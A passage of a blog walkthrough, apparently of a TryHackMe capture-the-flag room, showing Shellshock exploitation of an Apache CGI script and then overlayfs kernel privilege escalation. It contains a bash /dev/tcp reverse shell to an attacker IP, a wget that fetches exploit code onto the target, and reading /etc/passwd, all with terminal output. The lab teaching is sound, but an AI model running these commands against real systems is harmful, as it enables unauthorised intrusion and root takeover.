+Cisco UCS Manager 2.1<span class="o">(</span>1b<span class="o">)</span> - Remote Command Injection <span class="o">(</span>Shellshock<span class="o">)</span>               | hardware/remote/39568.py
+dhclient 4.1 - Bash Environment Variable Command Injection <span class="o">(</span>Shellshock<span class="o">)</span>         | linux/remote/36933.py
+GNU Bash - <span class="s1">'Shellshock'</span> Environment Variable Command Injection                  | linux/remote/34765.txt
+IPFire - <span class="s1">'Shellshock'</span> Bash Environment Variable Command Injection <span class="o">(</span>Metasploit<span class="o">)</span>  | cgi/remote/39918.rb
+NUUO NVRmini 2 3.0.8 - Remote Command Injection <span class="o">(</span>Shellshock<span class="o">)</span>                    | cgi/webapps/40213.txt
+OpenVPN 2.2.29 - <span class="s1">'Shellshock'</span> Remote Command Injection                          | linux/remote/34879.txt
+PHP &lt; 5.6.2 - <span class="s1">'Shellshock'</span> Safe Mode / disable_functions Bypass / Command Injec | php/webapps/35146.txt
+Postfix SMTP 4.2.x &lt; 4.2.48 - <span class="s1">'Shellshock'</span> Remote Command Injection             | linux/remote/34896.py
+RedStar 3.0 Server - <span class="s1">'Shellshock'</span> <span class="s1">'BEAM'</span> / <span class="s1">'RSSMON'</span> Command Injection           | linux/local/40938.py
+SonicWall SSL-VPN 8.0.0.0 - <span class="s1">'shellshock/visualdoor'</span> Remote Code Execution <span class="o">(</span>Unau | hardware/webapps/49499.py
+Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Command Injectio | cgi/webapps/39887.txt
+TrendMicro InterScan Web Security Virtual Appliance - <span class="s1">'Shellshock'</span> Remote Comma | hardware/remote/40619.py
+<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+<p><strong>Apache mod_cgi - ‘Shellshock’ Remote Command Injection</strong>. Let’s copy the exploit script <code class="language-plaintext highlighter-rouge">linux/remote/34900.py</code> to our local machine (kali linux)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/remote/34900.py 
+  Exploit: Apache mod_cgi - <span class="s1">'Shellshock'</span> Remote Command Injection
+      URL: https://www.exploit-db.com/exploits/34900
+     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /twseptian/lab/tryhackme/room/0day/34900.py
+</code></pre></div></div>
+<h1 id="gaining-access">Gaining Access</h1>
+<p>On the script add <code class="language-plaintext highlighter-rouge">/cgi-bin/test.cgi</code> as the vulnerable file</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span>
+<span class="k">except</span><span class="p">:</span>
+	<span class="n">pages</span> <span class="o">=</span> <span class="p">[</span><span class="s">"/cgi-bin/test.cgi"</span><span class="p">,</span><span class="s">"/cgi-sys/entropysearch.cgi"</span><span class="p">,</span><span class="s">"/cgi-sys/defaultwebpage.cgi"</span><span class="p">,</span><span class="s">"/cgi-mod/index.cgi"</span><span class="p">,</span><span class="s">"/cgi-bin/test.cgi"</span><span class="p">,</span><span class="s">"/cgi-bin-sdb/printenv"</span><span class="p">]</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="p">[</span><span class="n">SNIP</span><span class="p">]</span>
+</code></pre></div></div>
+<p>after we modified exploit python script, then run the exploit with command <code class="language-plaintext highlighter-rouge">python2.7 34900.py payload=reverse rhost=10.10.26.88 lhost=10.2.81.7 lport=4444</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python2.7 34900.py <span class="nv">payload</span><span class="o">=</span>reverse <span class="nv">rhost</span><span class="o">=</span>10.10.26.88 <span class="nv">lhost</span><span class="o">=</span>10.2.81.7 <span class="nv">lport</span><span class="o">=</span>4444                           1 ⨯
+<span class="o">[!]</span> Started reverse shell handler
+<span class="o">[</span>-] Trying exploit on : /cgi-bin/test.cgi
+<span class="o">[!]</span> Successfully exploited
+<span class="o">[!]</span> Incoming connection from 10.10.26.88
+10.10.26.88&gt; <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+
+10.10.26.88&gt; bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.2.81.7/4445 0&gt;&amp;1
+10.10.26.88&gt; 
+</code></pre></div></div>
+<p>To have tty shell from target, we tried to create another reverse shell connection <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.2.81.7/4445 0&gt;&amp;1</code> and prepare netcat listener <code class="language-plaintext highlighter-rouge">nc -lvnp 4445</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4445                                                                                           130 ⨯
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+Ncat: Connection from 10.10.26.88.
+Ncat: Connection from 10.10.26.88:57527.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>854<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@ubuntu:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 12
+drwxr-xr-x  2 root root 4096 Sep  2  2020 <span class="nb">.</span>
+drwxr-xr-x 54 root root 4096 Sep  2  2020 ..
+<span class="nt">-rwxr-xr-x</span>  1 root root   73 Sep  2  2020 test.cgi
+www-data@ubuntu:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@ubuntu:/usr/lib/cgi-bin<span class="err">$</span>
+</code></pre></div></div>
+<p>After we got tty shell interface, and next we need enumerate <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to get the information about all users on target machine</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+<span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</code></pre></div></div>
+<p>the local user is <code class="language-plaintext highlighter-rouge">ryan</code> with <code class="language-plaintext highlighter-rouge">/home/ryan</code> directory, and we can see flag on the directory</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">cd</span> /home/ryan
+<span class="nb">cd</span> /home/ryan
+www-data@ubuntu:/home/ryan<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 <span class="nb">.</span>
+drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 ryan ryan  220 Sep  2  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 ryan ryan 3637 Sep  2  2020 .bashrc
+drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
+<span class="nt">-rw-r--r--</span> 1 ryan ryan  675 Sep  2  2020 .profile
+<span class="nt">-rw-rw-r--</span> 1 ryan ryan   22 Sep  2  2020 user.txt
+www-data@ubuntu:/home/ryan<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+THM<span class="o">{</span>Sh3llSh0ck_r0ckz<span class="o">}</span>
+www-data@ubuntu:/home/ryan<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Check kernel version using command <code class="language-plaintext highlighter-rouge">uname -a</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+<span class="nb">uname</span> <span class="nt">-a</span>
+Linux ubuntu 3.13.0-32-generic <span class="c">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span>
+www-data@ubuntu:/usr/lib/cgi-bin<span class="nv">$ </span>
+</code></pre></div></div>
+<p>From the kernel version,machine has a vulnerable <a href="https://www.exploit-db.com/exploits/37292">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation(CVE-2015-1328)</a>.
+Let’s download exploit from exploit-db to our kali machine,and then transfer to target machine</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span>wget http://10.2.81.7/37292.c
+wget http://10.2.81.7/37292.c
+<span class="nt">--2021-08-01</span> 05:00:03--  http://10.2.81.7/37292.c
+Connecting to 10.2.81.7:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 <span class="o">(</span>5.0K<span class="o">)</span> <span class="o">[</span>text/x-csrc]
+Saving to: <span class="s1">'37292.c'</span>
+
+     0K ....                                                  100% 13.0M<span class="o">=</span>0s
+
+2021-08-01 05:00:04 <span class="o">(</span>13.0 MB/s<span class="o">)</span> - <span class="s1">'37292.c'</span> saved <span class="o">[</span>5119/5119]
+</code></pre></div></div>
+<p>We have some error when exploit.c was compiled</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span>gcc 37292.c <span class="nt">-o</span> ofs
+gcc 37292.c <span class="nt">-o</span> ofs
+gcc: error trying to <span class="nb">exec</span> <span class="s1">'cc1'</span>: execvp: No such file or directory
+www-data@ubuntu:/tmp<span class="nv">$ </span>
+</code></pre></div></div>
+<p>To fix the error, we need to export the binpath from the machine target using command <code class="language-plaintext highlighter-rouge">export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
+&lt;t <span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin         
+www-data@ubuntu:/tmp<span class="nv">$ </span>
+</code></pre></div></div>
+<p>and let’s try to recompile again the exploit script,then run the executable exploit</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span>gcc 37292.c <span class="nt">-o</span> ofs
+gcc 37292.c <span class="nt">-o</span> ofs
+www-data@ubuntu:/tmp<span class="err">$</span>
+</code></pre></div></div>
+<p>we got root access and flag</p>
+
+<p><img src="/assets/images/thm-0day/root.png" alt="root.png" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cve-2014-6278-2014-6271" class="page__taxonomy-item" rel="tag">CVE-2014-6278 2014-6271</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cve-2015-1328" class="page__taxonomy-item" rel="tag">CVE-2015-1328</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kernel-exploit" class="page__taxonomy-item" rel="tag">Kernel Exploit</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#shell-shock" class="page__taxonomy-item" rel="tag">Shell Shock</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+  
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">TryHackMe</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-08-01">August 1, 2021</time></p>
+
+
+      </footer>
+      
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-parkor/" class="pagination--pager" title="HackTheBox Business CTF 2021 - Parkor (Fullpwn)
+">Previous</a>
+    
+    
+      <a href="/penetration%20testing/oscp/oscp_prapation_indonesia/" class="pagination--pager" title="Pengalaman Ujian Sertifikasi OSCP
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
+- Date: 07/01/2022
+- Exploit Au...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
+- Date: 05/01/20222
+- Exploit Author: tw...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
+- Date: 2021-12-30
+- ...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+      
+        
+      
+          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
+          </li>
+        
+      
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+
+</div>
+<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/tryhackme/thm-0day/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/tryhackme/thm-0day"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
